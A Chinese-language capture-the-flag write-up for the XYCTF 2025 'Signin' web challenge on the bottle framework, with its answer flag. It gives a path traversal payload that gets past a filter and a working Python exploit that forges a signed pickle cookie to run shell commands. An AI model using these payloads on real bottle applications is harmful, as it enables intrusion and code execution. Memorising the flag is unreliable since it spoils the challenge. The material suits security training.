# Signin

> 分类：Web

## 题目描述

bottle 框架签到题。flag 在 `/flag_{uuid4}`。通过路径穿越读取 secret.txt，再用 bottle 的 pickle 反序列化 cookie 打 RCE。

## 考察知识点

- 路径穿越（`./../` 绕过）
- bottle cookie 签名 + pickle 反序列化

## 解法

1. **路径穿越读取 secret.txt**：download 路由禁止 `../../`、开头 `../`、`/`、`\`，用 `./../` 绕过：

```
/download?filename=./.././.././../secret.txt
```

得到 `Hell0_H@cker_Y0u_A3r_Sm@r7`。

2. **pickle 反序列化**：bottle 的 `get_cookie` 用 HMAC 签名后 `pickle.loads(base64.b64decode(msg))`。只要签名对得上即可触发反序列化。用 bottle 的 `cookie_encode` 生成 payload：

```python
from bottle import cookie_encode
import requests

secret = "Hell0_H@cker_Y0u_A3r_Sm@r7"

class Test:
    def __reduce__(self):
        return (eval, ("""__import__('os').system('cp /f* ./2.txt')""",))

exp = cookie_encode(('session', {"name": [Test()]}), secret)
requests.get('http://<target>/secret', cookies={'name': exp.decode()})
```

访问 `2.txt` 得到 flag。

## 参考答案

`flag{We1c0me_t0_XYCTF_2o25!The_secret_1s_L@men7XU_L0v3_u!}`

## 来源

- 作者：LamentXU（出题人） | https://www.cnblogs.com/LAMENTXU/articles/18730353
- 作者：竹言笙熙 | https://blog.csdn.net/oyf3085227433/article/details/147075769
